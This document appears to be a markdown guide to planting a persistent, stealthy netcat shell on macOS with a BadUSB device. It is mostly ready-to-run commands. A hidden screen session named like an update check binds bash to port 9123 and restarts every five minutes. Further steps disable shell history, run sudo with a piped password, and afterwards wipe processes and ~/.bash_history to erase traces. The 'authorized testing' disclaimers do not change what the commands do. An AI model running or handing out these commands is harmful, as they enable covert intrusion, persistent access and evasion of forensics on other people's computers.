# **Mac Endless Reverse Shell**

### **This guide is for educational purposes or authorized security testing only. Unauthorized access to computer systems is illegal and unethical.**

Interactive reverse shell on MacOS systems, leveraging **`nc`** (netcat). This approach is designed for stealth and efficiency, avoiding reliance on Python or any other non-standard tools on the target machine. Follow these steps carefully to maintain control over the target system discreetly.

## **Setup Instructions**

---

### **1. Establishing the Reverse Shell on the Target Machine via BadUSB**

**Objective:** Start a reverse shell listener on the target machine as a background process using **`screen`**.

Not used in the BadUSB script but good to have.

- **Initial Command:** This sets up a continuous loop that listens for incoming connections on port 9123, handling signals to clean up and exit gracefully if needed.

`screen -dmS upd_check bash -ic "unset HISTFILE; set +o history; trap 'rm -f /tmp/f; screen -S background_process -X quit; kill -SIGINT $$' EXIT; while true; do rm /tmp/f || true; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 9123 >/tmp/f; [ -f /tmp/terminate ] && break || true; sleep 1; done"` 

The BadUSB Payload:

- **Enhanced Command:** Improves upon the initial setup by attempting to re-establish the reverse shell every 5 minutes, ensuring connectivity even if the session is disrupted.

`screen -dmS upd_check bash -ic 'unset HISTFILE; set +o history; trap "rm -f /tmp/f; screen -S background_process -X quit; killall nc 2>/dev/null; kill -SIGINT $$" EXIT; while true; do rm /tmp/f || true; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 9123 >/tmp/f & sleep 300; pkill -f "nc -l 9123" 2>/dev/null && ps aux | awk "/bash -i/ && !/awk/ {print \$2}" | xargs kill -9; if [ -f /tmp/terminate ]; then break; fi; done'`

---

### **2. Configuring the Attacker's Machine**

**Objective:** Secure the reverse shell connection and prevent accidental disconnections.

- **Disable accidental interrupts:** Prevents the use of Ctrl+C from terminating the shell.

`stty intr ''  # Disable Ctrl+C`

- **Restore interrupt key:** Re-enables Ctrl+C functionality when needed.

`stty intr ^C # To reset`

- **Connecting:** Utilize **`rlwrap`** for a better shell experience when connecting to the target.

`rlwrap -r nc [TARGET_IP] 9123`

---

### **3. Managing the Session on the Victim's Machine**

**Objective:** Maintain stealth and control within the session.

- **Standard Shell Environment:** Enhances the shell for command execution without leaving history.
    
    `script -q /dev/null bash`
    `unset HISTFILE; set +o history && export PS1='\u@\h:\w\$'`
    
- **Executing Privileged Commands:** Executes commands as **`sudo`** without logging.
    
    `unset HISTFILE; set +o history && echo "password" | sudo -S whoami` 
    
- **Root Access:** After Switching to root execute this for not logging the commands.
    
    `unset HISTFILE`
    

---

### **4. Cleanup on the Victim Machine**

**Objective:** Remove traces of the reverse shell session and terminate gracefully.

- **Command for cleanup processes that are related to reverse shell:**

`nohup bash -c 'screen -S upd_check -X quit; sleep 3; screen -wipe; pkill -f "nc -l 9123"; ps aux | grep "[b]ash -i" | grep -v grep | awk "{print \$2}" | xargs -r kill -9; rm -f /tmp/f; rm -f ~/.bash_history' > /dev/null 2>&1 &`

- **Verification:** Confirm that all related processes are terminated and no listeners are active.

`ps aux | grep bash`

`screen -list`

`lsof -i :9123`

---

### **Important Note:**

When using the **`script`** command to enhance the shell environment, there's a risk of leaving the reverse shell process in a suspended state if the session exits unexpectedly. This can occur because the **`script`** command initiates a new shell session for logging purposes, and if this session is not properly terminated (for instance, due to a network disconnection or closing the terminal without exiting the **`script`** session), the underlying process may continue to run without the ability to reconnect. To mitigate this risk and ensure the ability to reconnect, it's crucial to exit the **`script`** session using the **`exit`** command before ending your reverse shell session. This ensures that all processes are terminated properly and the shell is left in a state that allows for future connections.

For the clarification on the **`screen`** command and how the enhanced command improves reliability:

### **Clarification on `screen` Command:**

The enhanced **`screen`** command offers a significant improvement over the initial setup by incorporating a mechanism to automatically attempt re-establishment of the reverse shell connection every 5 minutes. This approach is particularly useful in scenarios where the reverse shell might be disrupted due to network instability or if the initial connection is accidentally closed. By using a loop that periodically kills the existing **`nc`** (netcat) listener and starts a new one, the command ensures that the attacker can regain access to the target machine without needing to re-deploy the payload. This auto-reconnect feature makes the reverse shell more resilient to disconnections and enhances its persistence on the target machine, ensuring that temporary disruptions do not permanently sever the attacker's access.

### ***This procedure is designed for operational discretion and effectiveness. Ensure you have authorized access to the system before attempting this setup.***
